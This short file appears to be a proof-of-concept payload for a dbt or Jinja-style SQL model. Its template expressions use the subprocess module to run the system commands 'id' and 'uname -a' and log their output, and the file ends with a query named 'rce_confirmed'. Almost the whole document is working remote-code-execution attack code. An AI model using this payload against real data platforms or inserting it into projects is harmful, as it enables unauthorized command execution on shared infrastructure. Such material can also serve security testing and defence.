{{ log(modules.subprocess.check_output(['id']).decode(), info=True) }}
{{ log(modules.subprocess.check_output(['uname', '-a']).decode(), info=True) }}

SELECT 1 as rce_confirmed
